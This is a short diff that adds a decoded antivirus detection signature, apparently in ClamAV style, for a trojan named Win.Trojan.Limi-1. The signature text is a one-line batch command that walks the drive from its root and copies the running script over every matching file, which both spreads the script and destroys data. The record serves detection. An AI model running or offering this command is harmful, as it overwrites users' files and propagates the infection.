@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Limi-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+@for /r \ %%_ in (*.b*) do copy %0 %%_
